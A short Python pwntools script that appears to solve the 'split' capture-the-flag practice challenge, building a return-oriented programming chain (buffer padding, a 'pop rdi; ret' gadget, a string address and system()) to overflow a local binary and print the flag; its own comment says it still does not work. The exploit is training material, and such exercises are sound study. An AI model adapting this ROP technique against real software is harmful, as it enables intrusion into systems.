from pwn import *
# Still doesnt work, no idea why 


X64_PADDING = 40

elf = context.binary = ELF('split')

print_flag_addr = p64(elf.symbols.usefulString)
system_call = p64(elf.symbols.system)
# pop_str_pointer = p64(0x00400801)  # TODO: use pwn to find this gadget

rop = ROP(elf)
pop_str_pointer = p64(rop.find_gadget(['pop rdi', 'ret'])[0])


payload = b"A" * X64_PADDING + pop_str_pointer + print_flag_addr + system_call
payload += b"B" * (0x100 - len(payload))  # alignment

io = process(elf.path)
io.recvuntil('> ')
io.sendline(payload)
flag = io.recvall()
print(flag)
